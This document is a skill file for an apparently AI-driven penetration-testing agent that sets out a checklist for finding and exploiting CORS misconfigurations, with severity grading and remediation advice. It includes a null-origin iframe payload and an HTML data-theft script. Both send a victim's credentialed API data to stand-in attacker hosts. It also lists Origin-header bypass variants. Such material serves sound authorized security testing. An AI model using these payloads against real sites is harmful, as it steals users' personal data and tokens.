---
name: cors-testing
description: CORS misconfiguration testing for data theft and access control bypass
origin: AI Threat Hunting
---

# CORS Misconfiguration Testing

> **Kali MCP audit headers:** when calling Kali MCP for work governed by this skill, set `X-Technique: CORS` and `X-Probe-Kind` per the phase — `fingerprint` for ACAO/ACAC header probes, `payload` for crafted Origin-header attacks, `exploit` for cross-origin data-theft proof.

## When to Activate

- API returns `Access-Control-Allow-Origin` header
- Cross-origin requests observed in application flow
- Sensitive data served via API endpoints
- Single-page application with API backend

## Tools

- `curl` (send crafted Origin headers)
- Burp Suite Repeater
- Browser DevTools (Console for fetch tests)
- Corsy (automated CORS misconfiguration scanning — actively maintained, better edge-case detection)
- Custom HTML PoC pages

## Methodology

### 1. Baseline Check

- [ ] Send request without Origin — note default CORS headers
- [ ] Send with legitimate Origin — note response headers
- [ ] Check for: `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`
- [ ] Check `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers`
- [ ] Test on sensitive endpoints that return user data

### 2. Origin Reflection Test

- [ ] `Origin: https://evil.example` → does response reflect it in ACAO?
- [ ] `Origin: https://evil.example` + `Access-Control-Allow-Credentials: true` = Critical
- [ ] If ACAO reflects any origin → full data theft possible

### 3. Null Origin

- [ ] `Origin: null` → check if `Access-Control-Allow-Origin: null`
- [ ] Null origin triggered by: sandboxed iframes, `data:` URIs, local files
- [ ] PoC: `<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://target/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker/log?'+JSON.stringify(d)))</script>">`

### 4. Subdomain / Domain Variations

- [ ] `Origin: https://sub.target.example` — subdomain trust
- [ ] `Origin: https://target.example.evil.example` — suffix match flaw
- [ ] `Origin: https://eviltarget.example` — prefix match flaw
- [ ] `Origin: https://target.example\.evil.example` — regex escape bypass
- [ ] `Origin: https://target.example%60.evil.example` — encoded characters
- [ ] If subdomain accepted + XSS on subdomain = full chain

### 5. Wildcard Misconfiguration

- [ ] `Access-Control-Allow-Origin: *` — public access (lower severity)
- [ ] `*` with `Access-Control-Allow-Credentials: true` — browsers block this, but check
- [ ] Wildcard on sensitive endpoints = information disclosure

### 6. Preflight Bypass

- [ ] Simple requests (GET, POST with standard content-types) skip preflight
- [ ] Test if server enforces CORS only on OPTIONS but not on actual request
- [ ] Change Content-Type to `text/plain` to avoid preflight

### 7. Build Exploitation PoC

- [ ] Data theft PoC:
      ```html
      <script>
      fetch('https://target.example/api/sensitive-data', {
        credentials: 'include'
      })
      .then(r => r.json())
      .then(data => {
        fetch('https://attacker.example/steal?d=' + btoa(JSON.stringify(data)));
      });
      </script>
      ```
- [ ] Host on attacker domain, have victim visit
- [ ] Demonstrate exfiltrated data

### 8. Impact Assessment

- [ ] What data can be stolen? (PII, tokens, financial data)
- [ ] Can state-changing actions be performed? (CSRF via CORS)
- [ ] Is authentication data (cookies, tokens) included in cross-origin requests?
- [ ] Chain with subdomain takeover or XSS for higher impact

## What to Record

- Endpoint with CORS misconfiguration
- Exact ACAO and ACAC header values returned
- Origin value that triggered the misconfiguration
- Working PoC HTML demonstrating data theft
- Data accessible through the misconfiguration
- Severity: High (credentials + reflection) to Medium (wildcard, no credentials)
- Remediation: strict Origin allowlist, avoid reflecting Origin, avoid credentials with wildcard

## Kill Signals — Stop Testing When
- Origin reflection + Access-Control-Allow-Credentials: true → CRITICAL, record immediately, stop CORS testing
- ACAO is wildcard (*) but credentials NOT allowed → information disclosure only (MEDIUM at best), record and move on
- All origin variants rejected (null, subdomain, encoding) → CORS policy is restrictive, move on

## Escalate When
- The server reflects `Origin: null` with `Access-Control-Allow-Credentials: true` — sandboxed iframes, data: URIs, and redirected requests all produce null origin, the attack surface is real
- An allowlist check can be tricked by suffix/prefix match (`https://trusted.example.attacker.example`, `https://attacker-trusted.example`, `https://trusted.example@attacker.example`) — the regex is wrong, enumerate the full URL-parser confusion set
- Any subdomain of the target reflects or is whitelisted (`*.target.example`) AND you can get XSS/content control on any subdomain (old marketing site, staging, S3 takeover, user-controlled subdomain) — subdomain-to-apex CORS abuse is the classic chain
- The pre-flight response permits custom request headers, credentials, or non-simple methods for a broader origin set than the actual request check — CORS policies often diverge between preflight and actual response, test both
- A non-credentialed CORS read returns sensitive data (user profile, API keys, session metadata) even without `Allow-Credentials` — same-site cookies or IP-based auth can still leak through a wildcard ACAO

## Extended Resources

- `agent/references/payloads/cors-payloads.md` — null origin, subdomain wildcard, pre-flight bypass
